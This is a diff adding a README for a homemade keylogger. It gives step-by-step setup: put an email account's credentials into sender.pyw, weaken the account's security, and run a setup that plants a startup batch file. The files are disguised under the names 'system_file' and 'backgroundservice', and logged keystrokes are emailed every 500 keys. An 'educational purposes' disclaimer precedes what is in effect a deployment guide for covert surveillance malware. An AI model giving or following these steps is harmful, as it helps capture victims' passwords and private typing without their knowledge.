@@ -1,0 +1,21 @@
+By using this program you agree that I'm (the creator of program) not responsible for whatever the hell you use it for. This is just for educational purposes!
+
+Steps on setting up the program:
+
+1.) Edit sender.pyw, replace the Subject title/email/password etc... to your own accounts (Remember if you put your password in this account anyone who edits it, can see it), you'll need an ide that can edit python scripts
+
+2.) The paths in the batch/project1 files are relative and may need tweaking depending on the computer
+
+3.) You will have to fix the securtiy of your email account to allow the client to send emails to it, here's a link on how to do that https://support.google.com/accounts/answer/6010255?hl=en
+
+4.) Once all that is done, click the setup button, it will install a batch program in the startup and copy the rest of the files to a folder named system_file, the keylogger itself is called backgroundservice 
+
+NOTES:
+
+The program still isn't 100% functional, the only issue currently is that for some reason on stratup it doesn't actually work, opening it yourself will make it work perfectly
+
+The program will send an email every 500 keystrokes, you can change this in the project1 file if you want, just make sure you rename it to "backgroundservice" and get the file from the debug folder of visual studio 
+
+Once again, it's not perfect, but given basic programming skills, I'm sure you can make it fit your specific needs.
+
+
